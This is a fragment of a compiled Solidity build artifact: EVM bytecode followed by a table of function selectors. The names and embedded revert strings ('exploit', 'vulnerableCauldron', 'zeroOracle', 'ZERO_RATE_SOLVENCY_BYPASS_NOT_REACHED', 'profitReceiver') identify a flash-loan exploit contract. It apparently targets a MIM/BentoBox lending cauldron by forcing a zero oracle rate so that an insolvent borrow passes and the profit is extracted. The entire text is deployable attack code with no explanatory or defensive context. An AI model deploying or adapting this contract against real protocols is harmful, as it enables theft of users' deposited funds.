5041495200005f82015250565b5f613315601e83613103565b9150613320826132e1565b602082019050919050565b5f6020820190508181035f83015261334281613309565b9050919050565b5f6020828403121561335e5761335d612dbe565b5b5f61336b84828501612e3f565b91505092915050565b7f415558494c494152595f464c4153485f544f4f5f534d414c4c000000000000005f82015250565b5f6133a8601983613103565b91506133b382613374565b602082019050919050565b5f6020820190508181035f8301526133d58161339c565b9050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61341382612e20565b915061341e83612e20565b9250828201905080821115613436576134356133dc565b5b92915050565b5f819050919050565b5f61345f61345a6134558461343c565b613051565b612e20565b9050919050565b61346f81613445565b82525050565b5f60a0820190506134885f830188612f60565b6134956020830187612f60565b6134a26040830186612f60565b6134af6060830185612f38565b6134bc6080830184613466565b9695505050505050565b5f5f604083850312156134dc576134db612dbe565b5b5f6134e9858286016132a2565b92505060206134fa858286016132a2565b9150509250929050565b7f5a45524f5f4445504f5349545f534841524500000000000000000000000000005f82015250565b5f613538601283613103565b915061354382613504565b602082019050919050565b5f6020820190508181035f8301526135658161352c565b9050919050565b5f61357682612e20565b915061358183612e20565b9250828203905081811115613599576135986133dc565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b61360b816135f9565b82525050565b5f6060820190506136245f830186613602565b6136316020830185612f60565b61363e6040830184613029565b949350505050565b5f6040820190506136595f830185613602565b6136666020830184612f60565b9392505050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f60ff82169050919050565b6136ab81613696565b82525050565b5f6136bc83836136a2565b60208301905092915050565b5f602082019050919050565b5f6136de8261366d565b6136e88185613677565b93506136f383613687565b805f5b8381101561372357815161370a88826136b1565b9750613715836136c8565b9250506001810190506136f6565b5085935050505092915050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b61376281612e20565b82525050565b5f6137738383613759565b60208301905092915050565b5f602082019050919050565b5f61379582613730565b61379f818561373a565b93506137aa8361374a565b805f5b838110156137da5781516137c18882613768565b97506137cc8361377f565b9250506001810190506137ad565b5085935050505092915050565b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f82825260208201905092915050565b5f61382a826131da565b6138348185613810565b93506138448185602086016131f4565b61384d81613202565b840191505092915050565b5f6138638383613820565b905092915050565b5f602082019050919050565b5f613881826137e7565b61388b81856137f1565b93508360208202850161389d85613801565b805f5b858110156138d857848403895281516138b98582613858565b94506138c48361386b565b925060208a019950506001810190506138a0565b50829750879550505050505092915050565b5f6060820190508181035f83015261390281866136d4565b90508181036020830152613916818561378b565b9050818103604083015261392a8184613877565b9050949350505050565b7f5a45524f5f524154455f534f4c56454e43595f4259504153535f4e4f545f52455f8201527f4143484544000000000000000000000000000000000000000000000000000000602082015250565b5f61398e602583613103565b915061399982613934565b604082019050919050565b5f6020820190508181035f8301526139bb81613982565b9050919050565b5f6139cc82612e20565b91506139d783612e20565b92508282026139e581612e20565b915082820484148315176139fc576139fb6133dc565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f613a3a82612e20565b9150613a4583612e20565b925082613a5557613a54613a03565b5b828204905092915050565b5f604082019050613a735f830185612f60565b613a806020830184612f60565b9392505050565b5f60a082019050613a9a5f830188612f60565b613aa76020830187612f60565b613ab46040830186612f60565b613ac16060830185613466565b613ace6080830184612f38565b9695505050505050565b5f604082019050613aeb5f830185612f60565b613af86020830184612f38565b9392505050565b5f81905092915050565b5f613b13826131da565b613b1d8185613aff565b9350613b2d8185602086016131f4565b80840191505092915050565b5f613b448284613b09565b915081905092915050565b613b588161301e565b8114613b62575f5ffd5b50565b5f81519050613b7381613b4f565b92915050565b5f60208284031215613b8e57613b8d612dbe565b5b5f613b9b84828501613b65565b91505092915050565b7f5452414e534645525f4641494c454400000000000000000000000000000000005f82015250565b5f613bd8600f83613103565b9150613be382613ba4565b602082019050919050565b5f6020820190508181035f830152613c0581613bcc565b9050919050565b7f494e543235365f4f564552464c4f5700000000000000000000000000000000005f82015250565b5f613c40600f83613103565b9150613c4b82613c0c565b602082019050919050565b5f6020820190508181035f830152613c6d81613c34565b9050919050565b7f4e4f5f574f524b494e475f464c4153485f434f4e46494755524154494f4e00005f82015250565b5f613ca8601e83613103565b9150613cb382613c74565b602082019050919050565b5f6020820190508181035f830152613cd581613c9c565b9050919050565b5f604082019050613cef5f830185612f38565b613cfc6020830184612f38565b9392505050565b5f608082019050613d165f830187612f38565b613d236020830186612f38565b613d306040830185612f60565b8181036060830152613d428184613212565b905095945050505050565b7f4e4f5f5245414c495a45445f50524f46495400000000000000000000000000005f82015250565b5f613d81601283613103565b9150613d8c82613d4d565b602082019050919050565b5f6020820190508181035f830152613dae81613d75565b9050919050565b5f6020820190508181035f830152613dcd8184613212565b905092915050565b5f5f60408385031215613deb57613dea612dbe565b5b5f613df885828601613b65565b9250506020613e09858286016132a2565b9150509250929050565b7f5a45524f5f4f5241434c455f4e4f545f52455455524e494e475f46414c53455f5f8201527f5a45524f00000000000000000000000000000000000000000000000000000000602082015250565b5f613e6d602483613103565b9150613e7882613e13565b604082019050919050565b5f6020820190508181035f830152613e9a81613e61565b9050919050565b7f4d495353494e475f4d41535445525f434f4e54524143540000000000000000005f82015250565b5f613ed5601783613103565b9150613ee082613ea1565b602082019050919050565b5f6020820190508181035f830152613f0281613ec9565b9050919050565b5f67ffffffffffffffff82169050919050565b613f2581613f09565b82525050565b5f60e082019050613f3e5f83018a612f60565b613f4b6020830189612f60565b8181036040830152613f5d8188613212565b9050613f6c6060830187613f1c565b613f796080830186612f38565b613f8660a0830185612f38565b613f9360c0830184612f38565b98975050505050505050565b5f606082019050613fb25f830186612f60565b8181036020830152613fc48185613212565b9050613fd36040830184613029565b949350505050565b7f434c4f4e455f4445504c4f595f4641494c4544000000000000000000000000005f82015250565b5f61400f601383613103565b915061401a82613fdb565b602082019050919050565b5f6020820190508181035f83015261403c81614003565b9050919050565b7f494e49545f4449445f4e4f545f43414348455f5a45524f5f52415445000000005f82015250565b5f614077601c83613103565b915061408282614043565b602082019050919050565b5f6020820190508181035f8301526140a48161406b565b9050919050565b7f4e4f5f4d494d5f504149525f464f554e440000000000000000000000000000005f82015250565b5f6140df601183613103565b91506140ea826140ab565b602082019050919050565b5f6020820190508181035f83015261410c816140d3565b9050919050565b7f4e4f5f42454e544f5f4d494d5f4c4951554944495459000000000000000000005f82015250565b5f614147601683613103565b915061415282614113565b602082019050919050565b5f6020820190508181035f8301526141748161413b565b9050919050565b7f464c4153485f414d4f554e545f544f4f5f534d414c4c000000000000000000005f82015250565b5f6141af601683613103565b91506141ba8261417b565b602082019050919050565b5f6020820190508181035f8301526141dc816141a3565b9050919050565b7f415050524f56455f4641494c45440000000000000000000000000000000000005f82015250565b5f614217600e83613103565b9150614222826141e3565b602082019050919050565b5f6020820190508181035f8301526142448161420b565b9050919050565b5f6dffffffffffffffffffffffffffff82169050919050565b61426d8161424b565b8114614277575f5ffd5b50565b5f8151905061428881614264565b92915050565b5f63ffffffff82169050919050565b6142a68161428e565b81146142b0575f5ffd5b50565b5f815190506142c18161429d565b92915050565b5f5f5f606084860312156142de576142dd612dbe565b5b5f6142eb8682870161427a565b93505060206142fc8682870161427a565b925050604061430d868287016142b3565b915050925092509256fe6080604052348015600e575f5ffd5b506101b08061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063d6d7d5251461002d575b5f5ffd5b610047600480360381019061004291906100d6565b61005e565b604051610055929190610153565b60405180910390f35b5f5f5f5f915091509250929050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f84011261009657610095610075565b5b8235905067ffffffffffffffff8111156100b3576100b2610079565b5b6020830191508360018202830111156100cf576100ce61007d565b5b9250929050565b5f5f602083850312156100ec576100eb61006d565b5b5f83013567ffffffffffffffff81111561010957610108610071565b5b61011585828601610081565b92509250509250929050565b5f8115159050919050565b61013581610121565b82525050565b5f819050919050565b61014d8161013b565b82525050565b5f6040820190506101665f83018561012c565b6101736020830184610144565b939250505056fea2646970667358221220465bd8ba580a26dd47c078b2d1c700b87f3ea81d8032a87c7b591f5f7bfb9a3c64736f6c634300081e0033a2646970667358221220fc5a5a65aa011517dc49e97e77901bf6c64b5a906fcfc5570a59b1b6b2ff0e2964736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"MIM()":"daec383d","TARGET()":"cc1f2afa","TARGET_CAULDRON()":"bd7a598c","auxiliaryAmount()":"3538bc3a","bentoFlashFee()":"4b54b0cf","borrowedAmount()":"1afbb7a4","borrowedPart()":"b0b62eeb","borrowedShare()":"52d11fb4","depositedAmount()":"1d01364c","depositedShare()":"c4f0d1c6","execute()":"61461954","executeOnOpportunity()":"3c2448ed","exploit()":"63d9b770","flashAmount()":"b570137a","hypothesisValidated()":"463defd1","initOracleGetReturnedFalse()":"6e5f1ba7","initOracleRate()":"41f30ddf","onFlashLoan(address,address,uint256,uint256,bytes)":"23e30c8b","pairRepayAmount()":"54a33a07","profitAmount()":"5ff972cc","profitReceiver()":"355c8973","profitToken()":"49343624","run()":"c0406226","selectedPair()":"aa94f632","selectedQuoteToken()":"bab1ee88","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c","usedInitZeroRatePath()":"eaa15e1d","vulnerableCauldron()":"6c0e8226","zeroOracle()":"22cb9ca3"},"id":0}